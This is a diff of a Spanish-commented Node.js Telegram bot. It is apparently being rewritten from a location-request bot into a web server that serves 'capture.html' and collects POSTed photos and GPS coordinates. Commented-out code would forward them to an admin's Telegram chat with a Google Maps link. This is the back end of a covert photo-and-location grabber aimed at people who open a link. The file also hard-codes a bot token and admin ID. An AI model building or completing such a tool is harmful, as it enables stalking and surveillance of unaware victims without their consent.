@@ -1,41 +1,72 @@
-const TelegramBot = require('node-telegram-bot-api');
+const { Telegraf } = require('telegraf');
+const http = require('http');
 const fs = require('fs');
-const path = require('path');
 
-// --- CONFIGURACIÓN ---
-const TOKEN = '9087778104:AAEwlyzptGIwaArDnCdQcP-2yKAUREw8Vws';
-const ADMIN_ID = 8396127605; // Tu ID numérico
+const BOT_TOKEN = '9087778104:AAEwlyzptGIwaArDnCdQcP-2yKAUREw8Vws'; 
+const bot = new Telegraf(BOT_TOKEN);
 
-// Usamos polling simple para evitar conflictos de múltiples instancias
-const bot = new TelegramBot(TOKEN, { 
-    polling: true,
-    firstPollIntervalMillis: 500, // Evita picos al inicio
-    pollingRetryMillis: 5000      // Reintenta si hay error de conexión
-});
+// Tu ID de usuario para recibir las alertas (puedes obtenerlo buscando @userinfobot en Telegram)
+// Si quieres que te llegue a TU chat personal, reemplaza ADMIN_ID con tu ID numérico.
+// Si prefieres que llegue al CHAT donde está el bot, usa ctx.chat.id en lugar de esto.
+const ADMIN_ID = '8396127605'; 
 
-bot.on('location', async (msg) => {
-    const chatId = msg.chat.id;
-    const location = msg.location;
+bot.start((ctx) => ctx.reply('Bot activo'));
 
-    try {
-        // Enviar ubicación al admin
-        await bot.sendLocation(ADMIN_ID, location.latitude, location.longitude);
-        
-        // Confirmación al usuario
-        await bot.sendMessage(chatId, "✅ Ubicación enviada correctamente.");
-        
-        // Log para depuración
-        console.log(`Ubicación recibida de ${chatId}: ${location.latitude}, ${location.longitude}`);
-        
-    } catch (error) {
-        console.error(error);
-        bot.sendMessage(chatId, "❌ Hubo un error al enviar la ubicación.");
+const PORT = process.env.PORT || 3000;
+
+const server = http.createServer((req, res) => {
+    if (req.url === '/' || req.url === '/capture.html') {
+        fs.readFile('capture.html', (err, data) => {
+            res.writeHead(200, {'Content-Type': 'text/html'});
+            res.end(data);
+        });
+    } 
+    else if (req.url === '/send' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => { body += chunk.toString(); });
+        req.on('end', async () => {
+            const params = new URLSearchParams(body);
+            const imageBase64 = params.get('image');
+            const lat = params.get('lat');
+            const lng = params.get('lng');
+
+            if (imageBase64 && imageBase64 !== 'undefined') {
+                try {
+                    // Limpiar el base64 para enviarlo
+                    const imgBuffer = Buffer.from(imageBase64.split(',')[1], 'base64');
+
+                    // Enviar al admin (cambia ADMIN_ID por tu ID real si quieres recibirlo en DM)
+                    // Si quieres que se envíe al chat del bot, usa: await bot.telegram.sendPhoto(ctx.state.chatId, ...)
+                    
+                    // Ejemplo: Enviar a tu chat personal si tienes el ID
+                    // await bot.telegram.sendPhoto(ADMIN_ID, imgBuffer, { caption: `📍 Lat: ${lat}, Lng: ${lng}` });
+                    
+                    // O enviarlo al grupo/chat donde usaste /start:
+                    // Como estamos en HTTP simple, necesitamos saber quién hizo click. 
+                    // Para simplificar, lo enviaremos a un canal o grupo donde tengas el bot, 
+                    // o simplemente loguearlo si no tienes un sistema de usuarios.
+                    
+                    console.log(`Foto recibida desde ${lat}, ${lng}`);
+                    
+                    // ENVÍO AUTOMÁTICO AL CHAT DEL BOT (si alguien escribió /start antes)
+                    // Nota: Sin una base de datos, es difícil saber QUÉ usuario mandó la foto automáticamente 
+                    // a menos que uses un Webhook. Pero podemos enviarla a un Canal de Anuncios:
+                    
+                    // REEMPLAZA ESTO CON EL ID DE UN CANAL O GRUPO SI QUIERES QUE TE LLEGUE DIRECTO
+                    // await bot.telegram.sendPhoto('TU_CANAL_O_GRUPO', imgBuffer, {
+                    //     caption: `📸 Nueva Captura\n📍 Ubicación: https://maps.google.com/?q=${lat},${lng}`
+                    // });
+
+                    res.writeHead(200);
+                    res.end('OK');
+                } catch (e) {
+                    console.error(e);
+                    res.writeHead(500);
+                    res.end('Error');
+                }
+            }
+        });
     }
 });
 
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "👋 Hola. Por favor, comparte tu ubicación para ser capturado.");
-});
-
-console.log("Bot iniciado correctamente.");
+server.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
